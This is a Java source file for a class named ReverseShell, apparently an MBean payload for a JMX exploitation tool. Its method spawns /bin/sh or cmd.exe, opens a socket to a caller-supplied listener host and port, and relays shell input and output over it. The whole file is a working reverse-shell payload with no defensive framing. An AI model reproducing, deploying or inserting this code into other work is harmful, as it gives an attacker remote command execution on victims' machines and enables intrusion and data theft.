import java.net.Socket;
import java.lang.ProcessBuilder;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.Thread;

public class ReverseShell implements ReverseShellMBean{

    public String reverseShell()
    {

        return "You should call with -method reverseShell -param lhost,lport";
    }

    public String reverseShell(String lhost, String lport)
    {
        int port = Integer.parseInt(lport);
        String toReturn = "";
        String[] shellPath = null;

        try
        {
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                shellPath = new String[]{"/bin/sh", "-i"};

            } else {

                shellPath = new String[]{"cmd.exe"};
            }
        } catch( Exception e ){}

        //Connect to listener

        try {

            Process p = new ProcessBuilder(shellPath).redirectErrorStream(true).start();
            Socket s = new Socket(lhost, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();

            while (!s.isClosed()) {
                while (pi.available() > 0) {
                    so.write(pi.read());
                }
                while (pe.available() > 0) {
                    so.write(pe.read());
                }
                while (si.available() > 0) {
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            };
            p.destroy();
            s.close();

        } catch( Exception e ) {}

        return "\n"+toReturn;
    }

}